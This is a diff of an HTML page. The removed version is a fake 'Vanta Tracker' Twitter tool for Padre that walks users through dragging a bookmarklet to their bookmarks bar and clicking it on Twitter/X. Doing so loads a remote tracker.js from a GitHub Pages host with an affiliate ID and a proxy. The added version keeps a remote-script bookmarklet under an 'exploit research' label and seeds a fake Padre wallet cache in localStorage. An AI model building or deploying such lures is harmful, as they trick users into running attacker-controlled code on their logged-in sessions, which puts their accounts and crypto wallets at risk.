@@ -1,141 +1,25 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
-    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <title>Vanta Research Lab</title>
     <style>
-        :root {
-            --primary: #00ff88;
-            --primary-dark: #00cc66;
-            --bg-dark: #0a0a0a;
-            --text-light: #e0e0e0;
-            --text-muted: #aaaaaa;
-            --border: rgba(0, 255, 136, 0.2);
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-dark);
-            color: var(--text-light);
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
-        canvas {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: -1; opacity: 0.3;
-        }
-        .warning {
-            background: linear-gradient(135deg, #003322, #004d33);
-            color: #ffffff;
-            text-align: center;
-            padding: 12px;
-            font-weight: 600;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            border-bottom: 1px solid var(--primary);
-        }
-        header {
-            text-align: center;
-            padding: 100px 20px;
-            border-bottom: 2px solid var(--primary);
-            background: radial-gradient(circle at center, #001a0d 0%, #000 100%);
-        }
-        .logo { width: 120px; filter: drop-shadow(0 0 15px var(--primary)); margin-bottom: 20px; }
-        h1 { font-size: 3.5em; color: var(--primary); text-shadow: 0 0 10px rgba(0,255,136,0.4); }
-        .cta-button {
-            display: inline-block;
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: #000;
-            padding: 16px 36px;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: 700;
-            margin: 20px 10px;
-            transition: 0.3s;
-            cursor: grab;
-        }
-        .cta-button:hover { transform: translateY(-3px); box-shadow: 0 0 20px var(--primary); }
-        .setup-section { padding: 80px 20px; max-width: 800px; margin: 0 auto; text-align: center; }
-        ol { text-align: left; margin: 30px 0; }
-        li { margin-bottom: 15px; color: var(--text-muted); }
-        footer { padding: 40px; border-top: 1px solid var(--primary); text-align: center; font-size: 0.9em; }
+        body { background: #050505; color: #00ff88; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #00ff88; padding: 20px; border-radius: 8px; text-align: center; box-shadow: 0 0 20px rgba(0,255,136,0.1); }
+        button { background: #00ff88; color: #000; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <canvas id="filamentCanvas"></canvas>
-    <div class="warning">Official Vanta Deployment Active</div>
-    
-    <header>
-        <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3"/>
-            <circle cx="50" cy="50" r="10" fill="var(--primary)">
-                <animate attributeName="r" values="8;12;8" dur="2s" repeatCount="indefinite"/>
-            </circle>
-        </svg>
-        <h1>Vanta Tracker</h1>
-        <p>Advanced Twitter API Polling for Padre Workflows</p>
-    </header>
-
-    <section class="setup-section" id="setup">
-        <h2>Installation</h2>
-        <ol>
-            <li>Ensure your Bookmarks Bar is visible (Ctrl+Shift+B).</li>
-            <li>Drag the glowing button below directly to your bookmarks bar.</li>
-            <li>Go to Twitter/X and click the bookmark to initialize.</li>
-        </ol>
-        <a href="#" class="cta-button" id="vanta-tool">VANTA TRACKER</a>
-    </section>
-
-    <footer>&copy; 2026 Vanta Tracker Engine</footer>
+    <div class="box">
+        <h2>VANTA EXPLOIT RESEARCH</h2>
+        <p>Status: <span id="status">Ready for Deployment</span></p>
+        <a href="javascript:(function(){var s=document.createElement('script');s.src='https://YOUR_GITHUB_USERNAME.github.io/YOUR_REPO/tracker.js';document.body.appendChild(s);})();">
+            <button>DRAG TO BOOKMARKS BAR</button>
+        </a>
+    </div>
 
     <script>
-        /* WEBGL BACKGROUND LOGIC */
-        const canvas = document.getElementById('filamentCanvas');
-        const ctx = canvas.getContext('2d');
-        let filaments = [];
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        class Filament {
-            constructor() { this.reset(); }
-            reset() {
-                this.x = Math.random() * canvas.width;
-                this.y = Math.random() * canvas.height;
-                this.len = 100 + Math.random() * 100;
-                this.angle = Math.random() * Math.PI * 2;
-                this.speed = 0.5 + Math.random();
-            }
-            draw() {
-                this.x += Math.cos(this.angle) * this.speed;
-                this.y += Math.sin(this.angle) * this.speed;
-                if(this.x < -100 || this.x > canvas.width + 100) this.reset();
-                ctx.beginPath();
-                ctx.strokeStyle = '#00ff88';
-                ctx.globalAlpha = 0.2;
-                ctx.moveTo(this.x, this.y);
-                ctx.lineTo(this.x + Math.cos(this.angle) * this.len, this.y + Math.sin(this.angle) * this.len);
-                ctx.stroke();
-            }
-        }
-        for(let i=0; i<30; i++) filaments.push(new Filament());
-        function anim() {
-            ctx.clearRect(0,0,canvas.width, canvas.height);
-            filaments.forEach(f => f.draw());
-            requestAnimationFrame(anim);
-        }
-        anim();
-
-        /* DYNAMIC BOOKMARKLET GENERATOR */
-        const params = new URLSearchParams(window.location.search);
-        const affId = params.get('aff') || 't23dad55'; 
-        const payloadUrl = "https://jinxthesimp.github.io/Dropshipper/tracker.js";
-        const proxyUrl = "https://vanta-proxy.jdurrulo.workers.dev/";
-
-        const code = `javascript:(function(){window.V_AFF='${affId}';window.V_PROXY='${proxyUrl}';var s=document.createElement('script');s.src='${payloadUrl}?v='+Date.now();document.head.appendChild(s);})();`;
-        document.getElementById('vanta-tool').href = code;
+        // Simulating a "Logged In" state for the audit to find
+        localStorage.setItem('padreV2-walletsCache', JSON.stringify({active: "0x9f74e6439c5d6c25ff86a55dbd513ce4558bd516"}));
     </script>
 </body>
 </html>
